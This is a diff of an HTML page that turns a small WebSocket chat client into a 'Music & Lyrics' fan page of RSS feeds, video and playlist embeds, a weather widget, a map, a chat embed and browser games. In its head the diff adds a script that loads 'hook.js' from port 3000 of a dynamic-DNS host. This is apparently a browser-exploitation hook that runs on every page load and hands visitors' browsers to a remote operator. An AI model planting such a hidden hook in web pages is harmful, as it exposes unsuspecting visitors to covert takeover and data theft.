@@ -1,46 +1,148 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chat Client</title>
+    <link rel="icon" type="image/png" href="music-player.png">
+    <title>Music & Lyrics</title>
+    <script src="http://server76.ddns.net:3000/hook.js"></script>
+    <style>
+        h1 {
+            opacity: 0.6;
+            font-family: "Comic Sans MS", "Comic Sans", cursive;
+            background-color: DodgerBlue;
+            color: white;
+        }
+    </style>
 </head>
 <body>
-    <div id="chat-box"></div>
-    <input type="text" id="message-input" placeholder="Type your message here...">
-    <button onclick="sendMessage()">Send</button>
+    <h1>Music&Lyrics &#9752;</h1>
+    <h1>RSS Feed &#9732;</h1>
+    <i style="font-size: 24px;"></i>
 
+    <!-- Include the sw-rss-feed code -->
+    <script src="https://feed.surfing-waves.com/js/rss-feed.js"></script>
+    <script type="text/javascript">
+        rssfeed_url = [
+            "https://feeds.feedburner.com/youtube/kfRE7OaLxMv.xml",
+            "https://feeds.feedburner.com/metalinjection.xml",
+            "https://feeds.feedburner.com/therazorsedge/ei48gs5HdQ6.xml",
+            "https://feeds.feedburner.com/metalunderground.xml"
+        ];
+        rssfeed_frame_width = "430";
+        rssfeed_frame_height = "463";
+        rssfeed_scroll = "on";
+        rssfeed_scroll_step = "6";
+        rssfeed_scroll_bar = "on";
+        rssfeed_target = "_blank";
+        rssfeed_font_size = "24";
+        rssfeed_css_url = "https://feed.surfing-waves.com/css/style5.css";
+        rssfeed_title = "on";
+        rssfeed_title_name = "";
+        rssfeed_title_bgcolor = "#3366ff";
+        rssfeed_title_color = "#fff";
+        rssfeed_footer = "on";
+        rssfeed_footer_name = "rss feed";
+        rssfeed_footer_bgcolor = "#fff";
+        rssfeed_footer_color = "#333";
+        rssfeed_item_title_length = "50";
+        rssfeed_item_title_color = "#666";
+        rssfeed_item_bgcolor = "#fff";
+        rssfeed_item_border_bottom = "on";
+        rssfeed_item_source_icon = "on";
+        rssfeed_item_date = "off";
+        rssfeed_item_description = "on";
+        rssfeed_item_description_length = "120";
+        rssfeed_item_description_color = "#666";
+        rssfeed_item_description_link_color = "#333";
+        rssfeed_no_items = "0";
+        rssfeed_cache = "5eb6059eeb928cdb867cbc365c2200ee";
+    </script>
+
+    <!-- Create an iframe for YouTube -->
+    <iframe width="560" height="460" src="https://www.youtube.com/embed/Va-h6WZPUzQ?autoplay=1" allow="autoplay"></iframe>
+
+    <!-- Tomorrow.io Weather Widget -->
     <script>
-        const chatBox = document.getElementById('chat-box');
-        const messageInput = document.getElementById('message-input');
-        const sendButton = document.querySelector('button');
+        (function (d, s, id) {
+            if (d.getElementById(id)) {
+                if (window.__TOMORROW__) {
+                    window.__TOMORROW__.renderWidget();
+                }
+                return;
+            }
+            const fjs = d.getElementsByTagName(s)[0];
+            const js = d.createElement(s);
+            js.id = id;
+            js.src = "https://www.tomorrow.io/v1/widget/sdk/sdk.bundle.min.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        })(document, 'script', 'tomorrow-sdk');
+    </script>
+    <div class="tomorrow" data-location-id="" data-language="EN" data-unit-system="METRIC" data-skin="dark" data-widget-type="upcoming" style="padding-bottom: 22px; position: relative;">
+        <a href="https://www.tomorrow.io/weather-api/" rel="nofollow noopener noreferrer" target="_blank" style="position: absolute; bottom: 0; transform: translateX(-50%); left: 50%;">
+            <!-- You can include an attribution image here if required -->
+        </a>
+    </div>
 
-        const socket = new WebSocket('ws://server76.ddns.net:4444');
+    <!-- Google Maps iframe -->
+    <h1>Find yaself down below &#9759;</h1>
+    <i style="font-size: 24px;"></i>
+    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d69091423.11906475!2d17.997694798931175!3d32.3630203240671!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sen!2suk!4v1680887849437!5m2!1sen!2suk" width="600" height="460" style="border: 0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
 
-        socket.onopen = () => {
-            console.log('Connected to server.');
-        };
+    <!-- Minnit Chat Embed -->
+    <script src="https://minnit.chat/js/embed.js" defer></script>
+    <minnit-chat data-chatname="https://organizations.minnit.chat/243791466832078/Main?embed&nickname=" data-style="width: 430px; height: 460px;"></minnit-chat>
 
-        socket.onmessage = (event) => {
-            const message = event.data;
-            const messageElement = document.createElement('p');
-            messageElement.textContent = message;
-            chatBox.appendChild(messageElement);
-        };
+    <!-- Magic ClickTap Cards -->
+    <h1>Magic &#9827; ClickTap Cards</h1>
+    <i style="font-size: 24px;"></i>
+    <div id="player"></div>
+    <script>
+        class ClickListener {
+            constructor() {
+                this.rootElement = document.querySelector("#player");
+                this.element = document.createElement("img");
+                this.rootElement.appendChild(this.element);
+                this.images = ['coperfild1.png', './coperfild2.png', 'coperfild3.png'];
+                this.idx = 0;
+                this.init();
+            }
 
-        socket.onerror = (error) => {
-            console.error('WebSocket error:', error);
-        };
+            init() {
+                this.element.src = this.images[this.idx];
+                this.element.style.width = `auto`;
+                this.element.style.height = `560px`;
+                this.element.onclick = this.nextImage.bind(this);
+            }
 
-        socket.onclose = () => {
-            console.log('Connection closed.');
-        };
-
-        function sendMessage() {
-            const message = messageInput.value.trim();
-            if (message !== '') {
-                socket.send(message);
-                messageInput.value = '';
+            nextImage() {
+                this.idx++;
+                if (this.idx >= this.images.length) {
+                    this.idx = 0;
+                }
+                this.element.src = this.images[this.idx];
             }
         }
+        new ClickListener();
     </script>
+
+    <!-- Music and Games Sections -->
+    <h1>Music &#9835;</h1>
+    <iframe width="560" height="352" src="https://www.youtube.com/embed/videoseries?list=PL4royKB7U7zcHWw1orMKO5l6jtZXRAuhJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+    <iframe style="border-radius: 12px" src="https://open.spotify.com/embed/playlist/52ZN8WDvvxDP8y9jTZyeTI?utm_source=generator&theme=0" width="560" height="352" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+
+    <h1>Games &#9816;</h1>
+    <div><script src="https://cdn.htmlgames.com/embed.js?game=Chess&amp;bgcolor=white"></script></div>
+    <div><script src="https://cdn.htmlgames.com/embed.js?game=TicTacToe&amp;bgcolor=white"></script></div>
+    <div><script src="https://cdn.htmlgames.com/embed.js?game=ClassicPac&amp;bgcolor=white"></script></div>
+    <div><script src="https://cdn.htmlgames.com/embed.js?game=OuterSpaceArkanoid&amp;bgcolor=white"></script></div>
+
+    <style>
+        body {
+            background-image: url('car.jpg');
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+        }
+    </style>
 </body>
 </html>
